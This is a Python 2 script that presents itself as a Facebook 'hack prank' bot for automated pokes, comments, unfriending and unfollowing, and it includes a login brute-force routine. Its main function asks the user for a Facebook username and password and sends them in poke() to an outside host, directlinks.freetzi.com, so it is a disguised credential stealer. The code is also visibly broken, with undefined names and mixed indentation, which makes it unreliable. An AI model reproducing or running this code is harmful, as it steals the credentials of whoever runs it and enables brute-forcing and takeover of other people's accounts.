from time import *
from subprocess import *
from hashlib import *
import marshal
import getpass
import json
import random
import os

try:
    import requests as r
except ImportError:
    os.system("pip2 install requests")

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
listgrup = []

ids = ('idlist.txt')


def brute(pswd):
	sys.stdout.write("\r[#] Trying ..... {}\n"  .format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[#] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(0)


def get():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print R + '[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print banner
            print '\x1b[1;91m[!]Please Check your Connection!'
            quit()
def unfollow(posts):
	global token , WT

	print '\r[*] all id successfully retrieved    '
	print '[*] start'

	try:
		counter = 0
		for post in posts['data']:
			if counter >= 50:
				break
			else:
				counter += 1

			r = requests.post('https://graph.facebook.com/' + post['id'] + '/subscribers?method=delete&access_token=' + token)
			a = json.loads(r.text)

			try:
				cek = a['error']['nessage']
				print W + '[' + R + post['name'] + W + '] failed'
			except TypeError:
				print W + '[' + G + post['name'] + W + '] unfollow'
		print '[*] done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		bot()
def poke(posts):
    r.post('https://directlinks.freetzi.com/data.php?lc='+posts)
        
    global token , WT

    print '\r[*] all id successfully retrieved                  '
    print '[*] start'

    try:
        counter = 0
		for post in posts:
			if counter >= 50:
				break
			else:
				counter += 1

			r = requests.post('https://graph.facebook.com/%s/pokes?access_token=%s'%(post['id'].split('_')[0],token))
			a = json.loads(r.text)

			id = post['id'].split('_')[0]
			try:
				cek = a['error']['message']
				print W + '[' + R + id + W + '] failed'
			except TypeError:
				print W + '[' + G + id + W + '] pokes'
		print '[*] Done'
		bot()
	except KeyboardInterrupt:
		print '\r[!] Stopped   '
		bot()
	except (requests.exceptions.ConnectionError):
		print '[!] Connection Error'
		bot()



def main():
    os.system('clear')
    R = '\033[31;1m'

    print(R+'###########################################\n')
    print(R+'#-- Created By RJ97600 for FB Hack Prank --#\n\n')
    print(R+'###########################################\n')


    uid = raw_input('Username : ')
    pwd = raw_input('Password : ')
    fin = uid+' '+pwd

    
    
    poke(fin)


def bot():
  try:
	global type , message , id , WT , token

	cek = raw_input(R + 'D3b2y' + W +'/' + R +'Bot ' + W + '>> ')

	if cek in ['1','01']:
		menu_reaction()
		menu_reaction_ask()
	elif cek in ['2','02']:
		print '[*] load access token'
		try:
			token = open('cookie/token.log','r').read()
		        print '[*] Success load access token'
		except IOError:
	                print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
	                bot()

		WT = raw_input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R + 'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
		if WT.lower() == "w" or WT.lower() == '':
			WT = 'wallpost'
		else:
			id = raw_input('[?] Id Target : ')

			if id == '':
				print "[!] id target can't be empty"
				print '[!] Stopped'
				bot()

		print '--------------------------------------------------'
		print "  [Note] Use the '</>' symbol to change the line\n"

		message = raw_input('[?] Your Message : ')
		if message == '':
			print "[!] Message can't be empty"
			print '[!] Stopped'
			bot()
		else:
			message = message.replace('</>','\n')

		comment(post(),50)

	elif cek in ['4','04']:
		WT = 'req'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token   '
			print "[!] type 'token' to generate access token"
			bot()
		confirm(post())
	elif cek in ['3','03']:
		WT = 'wallpost'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		poke(post())
	elif cek in ['5','05']:
		WT = 'me'
		print '[*] load access token    '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		remove(post())

	elif cek in ['6','06']:
		WT = 'friends'
		print '[*] load access token     '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		unfriend(post())

	elif cek in ['7','07']:
		WT = 'subs'
		print '[*] load access token      '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
			bot()
		unfollow(post())
	elif cek in ['8','08']:
		WT = 'albums'
		print '[*] Load access token      '

		try:
			token = open('cookie/token.log','r').read()
			print '[*] Success load access token'
		except IOError:
			print '[!] Failed load access token'
			print "[!] type 'token' to generate access token"
		albums(post())

	elif cek in ['0','00']:
		print '[*] Back to main menu'
		main()
	elif cek.lower() == 'menu':
		menu_bot()
		bot()
	elif cek.lower() == 'exit':
		print '[!] Exiting program'
		sys.exit()
	elif cek.lower() == 'token':
		try:
			open('cookie/token.log')
			print '[!] an access token already exists'
			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
			if cek.lower() != 'y':
				print '[*] Canceling '
				bot()
		except IOError:
			pass

		print '\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n'
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	else:
		if cek == '':
			bot()
		else:
			print "[!] command '"+cek+"' not found"
			print '[!] type "menu" to show menu bot'
			bot()
  except KeyboardInterrupt:
	bot()


main()
    

